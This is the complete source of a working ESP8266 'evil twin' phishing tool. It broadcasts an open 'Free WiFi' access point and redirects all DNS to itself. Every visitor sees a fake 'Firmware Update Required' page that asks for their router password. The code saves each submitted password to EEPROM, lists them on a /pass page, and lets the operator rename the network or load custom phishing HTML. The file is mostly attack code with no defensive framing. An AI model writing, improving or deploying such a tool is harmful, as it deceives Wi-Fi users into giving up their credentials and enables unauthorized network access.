// Libraries
#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <EEPROM.h>

// Default SSID name
const char* SSID_NAME = "Free WiFi";

// Default main strings
#define SUBTITLE "Router Configuration"
#define TITLE "Firmware Update Required"
#define BODY "Please enter your password to update the firmware for enhanced security and performance."
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please wait a moment."
#define PASS_TITLE "Stored Passwords"
#define CLEAR_TITLE "Passwords Cleared"
#define ERROR_TITLE "Error"
#define ERROR_BODY "Password must be at least 8 characters long or leave it empty."

// Init system settings
#define DNS_PORT 53
const byte HTTP_CODE = 200;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String allPass = "";
String newSSID = "";
String currentSSID = SSID_NAME;
String currentPassword = "";
int currentChannel = 1;
bool useCustomPage = false;  // New flag for custom page usage

// For storing passwords and custom page content in EEPROM.
int initialCheckLocation = 20; // Location to check whether the ESP is running for the first time.
int passStart = 30;            // Starting location in EEPROM to save password.
int passEnd = passStart;       // Ending location in EEPROM to save password.
int pageContentStart = 250;    // Starting location in EEPROM to save custom page content.

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

String input(String argName) {
    String a = webServer.arg(argName);
    a.replace("<", "&lt;");
    a.replace(">", "&gt;");
    return a.substring(0, 200);
}

String footer() {
    return "</div><footer style=\"text-align:center; padding:10px; font-size:0.8em; color:#666;\">&copy; 2024 All rights reserved.</footer></body></html>";
}

String header(String t) {
    String CSS = "@media (max-width: 600px) {"
                 "  .container { width: 90%; margin: 5% auto; }"
                 "}"
                 "body { font-family: 'Arial', sans-serif; margin: 0; padding: 0; background-color: #f4f4f9; color: #333; }"
                 ".container { max-width: 600px; margin: 50px auto; padding: 20px; background-color: #ffffff; border-radius: 12px; box-shadow: 0 0 15px rgba(0,0,0,0.1); }"
                 ".title { color: #007bff; font-size: 24px; margin-bottom: 20px; text-align: center; }"
                 "input[type=text], input[type=password], input[type=number], textarea { width: 100%; padding: 10px; margin-bottom: 20px; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; transition: border-color 0.3s ease; }"
                 "input[type=text]:focus, input[type=password]:focus, input[type=number]:focus, textarea:focus { border-color: #007bff; outline: none; }"
                 "input[type=submit] { width: 100%; background-color: #007bff; color: white; border: none; padding: 12px; border-radius: 5px; font-size: 16px; cursor: pointer; transition: background-color 0.3s ease; }"
                 "input[type=submit]:hover { background-color: #0056b3; }"
                 "label { font-weight: bold; margin-bottom: 5px; display: block; }"
                 "nav { background-color: #007bff; color: #fff; padding: 15px; text-align: center; border-radius: 12px 12px 0 0; margin-bottom: 20px; }"
                 ".nav-title { font-size: 20px; margin: 0; }"
                 ".error { color: red; font-weight: bold; text-align: center; }";
    
    String h = "<!DOCTYPE html><html><head><title>" + currentSSID + " | " + t + "</title><meta name=viewport content=\"width=device-width,initial-scale=1\"><style>" + CSS + "</style><meta charset=\"UTF-8\"></head><body><nav><div class=\"nav-title\">" + SUBTITLE + "</div></nav><div class=\"container\"><div class=\"title\">" + t + "</div>";
    return h;
}

String index() {
    if (useCustomPage) {
        return readCustomPageFromEEPROM();
    }
    return header(TITLE) + "<div>" + BODY + "</div><form action=/post method=post><input type=password name=m placeholder=\"Enter Password\"></input><input type=submit value=\"Update\"></form>" + footer();
}

String posted() {
    String pass = input("m");
    if (pass.length() < 8 && pass.length() != 0) {
        return header(ERROR_TITLE) + "<div class=\"error\">" + ERROR_BODY + "</div><center><a style=\"color:#007bff\" href=/>Back to Home</a></center>" + footer();
    }
    pass = "<li><b>" + pass + "</b></li>"; // Adding password in an ordered list.
    allPass += pass;                       // Updating the full passwords.

    // Storing passwords to EEPROM.
    for (int i = 0; i <= pass.length(); ++i) {
        EEPROM.write(passEnd + i, pass[i]); // Adding password to existing password in EEPROM.
    }

    passEnd += pass.length(); // Updating end position of passwords in EEPROM.
    EEPROM.write(passEnd, '\0');
    EEPROM.commit();
    return header(POST_TITLE) + "<div>" + POST_BODY + "</div>" + footer();
}

String pass() {
    return header(PASS_TITLE) + "<ol>" + allPass + "</ol><center><p><a style=\"color:#007bff\" href=/>Back to Home</a></p><p><a style=\"color:#007bff\" href=/clear>Clear Passwords</a></p></center>" + footer();
}

String ssid() {
    return header("Change SSID") + 
           "<form name=\"ssidForm\" action=/postSSID method=post onsubmit=\"return validateForm()\">"+
           "<label>New SSID</label>" +
           "<input type=text name=s placeholder=\"Enter New SSID\"></input>" +
           "<label>Password</label>" +
           "<input type=password name=p placeholder=\"Enter Password (leave empty for no password)\"></input>" +
           "<label>Channel</label>" +
           "<input type=number name=c min=\"1\" max=\"13\" value=\"" + String(currentChannel) + "\"></input>" +
           "<div id=\"error\" class=\"error\"></div>" +
           "<input type=submit value=\"Update\"></form>" + 
           footer();
}

String postedSSID() {
    String postedSSID = input("s");
    String newPassword = input("p");

    // Kiểm tra nếu độ dài mật khẩu mới nhỏ hơn 8 và không phải là chuỗi rỗng
    if (newPassword.length() < 8 && newPassword.length() != 0) {
        return header(ERROR_TITLE) + "<div class=\"error\">" + ERROR_BODY + "</div><center><a style=\"color:#007bff\" href=\"/ssid\">Back</a></center>" + footer();
    }

    String channelStr = input("c");
    int newChannel = channelStr.toInt();
    if (newChannel < 1 || newChannel > 13) newChannel = 1; // Kiểm tra tính hợp lệ của kênh

    // Lưu SSID, mật khẩu và kênh vào EEPROM
    for (int i = 0; i < postedSSID.length(); ++i) {
        EEPROM.write(i, postedSSID[i]);
    }
    EEPROM.write(postedSSID.length(), '\0');

    for (int i = 0; i < newPassword.length(); ++i) {
        EEPROM.write(passStart + i, newPassword[i]);
    }
    EEPROM.write(passStart + newPassword.length(), '\0');

    EEPROM.write(100, newChannel); // Giả sử 100 là vị trí an toàn trong EEPROM cho kênh
    EEPROM.commit();

    currentSSID = postedSSID;
    currentPassword = newPassword;
    currentChannel = newChannel;
    WiFi.softAP(currentSSID.c_str(), currentPassword.length() > 0 ? currentPassword.c_str() : NULL, currentChannel); // Áp dụng SSID, mật khẩu và kênh mới
    return header("SSID Updated") + "<div>SSID changed to <b>" + postedSSID + "</b> with the new password on channel <b>" + String(newChannel) + "</b>. Please reconnect to the new WiFi.</div>" + footer();
}

String clear() {
    allPass = "";
    passEnd = passStart; // Setting the password end location -> starting position.
    EEPROM.write(passEnd, '\0');
    EEPROM.commit();
    return header(CLEAR_TITLE) + "<div>The password list has been reset.</div><center><a style=\"color:#007bff\" href=/>Back to Home</a></center>" + footer();
}

void BLINK() { // The built-in LED will blink 5 times after a password is posted.
    for (int counter = 0; counter < 10; counter++) {
        // For blinking the LED.
        digitalWrite(BUILTIN_LED, counter % 2);
        delay(500);
    }
}

void setup() {
    // Serial begin
    Serial.begin(115200);
    
    bootTime = lastActivity = millis();
    EEPROM.begin(512);
    delay(10);

    // Check whether the ESP is running for the first time.
    String checkValue = "first"; // This will will be set in EEPROM after the first run.

    for (int i = 0; i < checkValue.length(); ++i) {
        if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
            // Add "first" in initialCheckLocation.
            for (int i = 0; i < checkValue.length(); ++i) {
                EEPROM.write(i + initialCheckLocation, checkValue[i]);
            }
            EEPROM.write(0, '\0');         // Clear SSID location in EEPROM.
            EEPROM.write(passStart, '\0'); // Clear password location in EEPROM
            EEPROM.write(100, 1);          // Default channel
            EEPROM.write(pageContentStart, '\0'); // Clear custom page content
            EEPROM.commit();
            break;
        }
    }
    
    // Read EEPROM SSID
    String ESSID;
    int i = 0;
    while (EEPROM.read(i) != '\0') {
        ESSID += char(EEPROM.read(i));
        i++;
    }
    currentSSID = ESSID.length() > 1 ? ESSID.c_str() : SSID_NAME;

    // Read password from EEPROM
    String password;
    i = 0;
    while (EEPROM.read(passStart + i) != '\0') {
        password += char(EEPROM.read(passStart + i));
        i++;
    }
    currentPassword = password;

    // Read channel from EEPROM
    currentChannel = EEPROM.read(100); // Read the stored channel
    if (currentChannel < 1 || currentChannel > 13) currentChannel = 1; // Validate channel

    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));

    Serial.print("Current SSID: ");
    Serial.println(currentSSID);
    Serial.print("Current Channel: ");
    Serial.println(currentChannel);
    WiFi.softAP(currentSSID.c_str(), currentPassword.c_str(), currentChannel);

    // Start webserver
    dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only for HTTP)
    webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
    webServer.on("/ssid",[]() { webServer.send(HTTP_CODE, "text/html", ssid()); });
    webServer.on("/postSSID",[]() { webServer.send(HTTP_CODE, "text/html", postedSSID()); });
    webServer.on("/pass",[]() { webServer.send(HTTP_CODE, "text/html", pass()); });
    webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
    webServer.on("/captive",[]() { webServer.send(HTTP_CODE, "text/html", captiveSetting()); });
    webServer.on("/postCaptive",[]() { webServer.send(HTTP_CODE, "text/html", postCaptiveSetting()); });
    webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
    webServer.begin();

    // Enable the built-in LED
    pinMode(BUILTIN_LED, OUTPUT);
    digitalWrite(BUILTIN_LED, HIGH);
}

String captiveSetting() {
    // Render the page to select captive portal settings
    return header("Captive Portal Settings") +
        "<form action='/postCaptive' method='post'>" +
        "<label><input type='radio' name='useCustom' value='0'" + (useCustomPage ? "" : " checked") + "> Use Default Page</label><br>" +
        "<label><input type='radio' name='useCustom' value='1'" + (useCustomPage ? " checked" : "") + "> Use Custom Page</label><br>" +
        "<textarea name='customContent' placeholder='Enter custom HTML content here' style='height:200px;'>" + readCustomPageFromEEPROM() + "</textarea>" +
        "<input type='submit' value='Save'>" +
        "</form>" +
        footer();
}

String postCaptiveSetting() {
    String useCustom = webServer.arg("useCustom");
    String customContent = webServer.arg("customContent");

    useCustomPage = (useCustom == "1");

    // Save the custom HTML content to EEPROM if custom page is selected
    if (useCustomPage) {
        for (int i = 0; i < customContent.length(); ++i) {
            EEPROM.write(pageContentStart + i, customContent[i]);
        }
        EEPROM.write(pageContentStart + customContent.length(), '\0');
        EEPROM.commit();
    }

    return header("Settings Updated") +
        "<div>Settings have been updated. <a href='/'>Return to Home</a></div>" +
        footer();
}

String readCustomPageFromEEPROM() {
    String customContent;
    int i = 0;
    while (EEPROM.read(pageContentStart + i) != '\0') {
        customContent += char(EEPROM.read(pageContentStart + i));
        i++;
    }
    return customContent;
}

void loop() { 
    if ((millis() - lastTick) > TICK_TIMER) {lastTick = millis();}
    dnsServer.processNextRequest();
    webServer.handleClient();
}
